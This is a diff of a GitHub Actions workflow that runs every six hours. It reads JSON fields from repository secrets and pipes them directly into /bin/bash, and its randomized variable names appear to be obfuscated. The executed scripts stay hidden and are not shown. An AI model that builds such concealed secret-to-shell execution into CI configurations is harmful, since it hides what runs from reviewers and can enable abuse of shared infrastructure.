@@ -3,34 +3,18 @@ name: luorenzong1098
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 1/6 * * *'
-jobs:  # 21784
+    - cron: '37 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: luorenzong1098
         env:
-          m75925: ${{ secrets.m75925 }}
+          iemvu37478: ${{ secrets.iemvu37478 }}
         run: |
-          echo $m75925 | jq -r .zfwh6022 | /bin/bash
-          echo $aqhb73 | jq -r .fdgmq547 | /bin/bash
-          echo $i9 | jq -r .guhw91 | /bin/bash
-          echo $y0410 | jq -r .ux75 | /bin/bash
-          echo $nhmio30980 | jq -r .rb7571 | /bin/bash
-          echo $lgx68 | jq -r .dicc10359 | /bin/bash
-          echo $zbpzj43 | jq -r .ohev68 | /bin/bash
-          echo $y90 | jq -r .ghk8 | /bin/bash
-          echo $oixrp428 | jq -r .tj000 | /bin/bash
-          echo $bega1527 | jq -r .aqqqu2 | /bin/bash
-          echo $bi1691 | jq -r .nldgm8 | /bin/bash
-          echo $l4929 | jq -r .iq48100 | /bin/bash
-          echo $c75 | jq -r .g5985 | /bin/bash
-          echo $x95 | jq -r .r16794 | /bin/bash
-          echo $wnmb35 | jq -r .tkwjs747 | /bin/bash
-          echo $tay119 | jq -r .pw15648 | /bin/bash
-          echo $cfn510 | jq -r .oq4436 | /bin/bash
-          echo $oxtl45 | jq -r .t934 | /bin/bash
-          echo $uj17083 | jq -r .glhx721 | /bin/bash
+          echo $iemvu37478 | jq -r .xzr9 | /bin/bash
+          echo $u9 | jq -r .o8463 | /bin/bash
+          echo $xt139 | jq -r .ozu28338 | /bin/bash
+          echo $qilar968 | jq -r .wmzqn041 | /bin/bash
 
